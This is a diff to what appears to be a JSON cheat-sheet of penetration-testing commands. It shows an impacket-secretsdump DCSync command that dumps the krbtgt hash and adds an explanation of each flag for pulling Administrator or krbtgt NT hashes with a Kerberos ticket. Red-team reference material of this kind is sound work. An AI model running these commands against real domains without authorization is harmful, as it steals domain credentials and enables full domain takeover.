@@ -96,5 +96,6 @@
       "label": "Only krbtgt",
       "command": "impacket-secretsdump -k -no-pass -just-dc-user krbtgt -dc-ip <dc_ip> <domain>/<user>@<dc_fqdn>"
     }
-  ]
+  ],
+  "explain": "DCSyncs an account's hashes using a Kerberos ticket (pass-the-certificate/ticket path):\n  impacket-secretsdump     the secrets dumper\n  -k -no-pass              authenticate with the ticket in KRB5CCNAME, no password\n  -dc-ip <dc_ip>           the DC to replicate from\n  -just-dc-user <target>   only pull this account's secrets (e.g. Administrator or krbtgt)\n  '<domain>/<account>'@<dc_fqdn>   the principal the ticket is for (often a machine account like DC01$)\nA machine-account TGT typically has replication rights, so this yields the Administrator/krbtgt NT hash."
 }
